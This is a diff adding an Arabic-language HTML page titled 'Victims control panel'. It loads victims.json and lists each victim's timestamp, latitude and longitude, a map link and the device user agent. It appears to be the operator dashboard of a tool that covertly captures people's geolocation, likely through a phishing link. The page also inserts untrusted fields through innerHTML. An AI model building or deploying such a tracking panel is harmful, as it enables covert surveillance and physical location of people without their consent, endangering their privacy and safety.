@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>لوحة تحكم الضحايا</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f3f4f6;
+      padding: 20px;
+      direction: rtl;
+      text-align: right;
+    }
+
+    h2 {
+      color: #333;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    th, td {
+      padding: 10px;
+      border: 1px solid #ddd;
+      font-size: 14px;
+    }
+
+    th {
+      background-color: #4CAF50;
+      color: white;
+    }
+
+    tr:nth-child(even) {
+      background-color: #f9f9f9;
+    }
+
+    a {
+      color: #2196F3;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>قائمة الضحايا</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>التاريخ</th>
+        <th>الموقع</th>
+        <th>الرابط</th>
+        <th>نوع الجهاز</th>
+      </tr>
+    </thead>
+    <tbody id="victim-table"></tbody>
+  </table>
+
+  <script>
+    fetch('victims.json')
+      .then(res => res.json())
+      .then(data => {
+        const table = document.getElementById('victim-table');
+        data.reverse().forEach(v => {
+          table.innerHTML += `
+            <tr>
+              <td>${v.timestamp}</td>
+              <td>${v.latitude}, ${v.longitude}</td>
+              <td><a href="${v.locationUrl}" target="_blank">عرض على الخريطة</a></td>
+              <td>${v.userAgent}</td>
+            </tr>`;
+        });
+      });
+  </script>
+
+</body>
+</html>
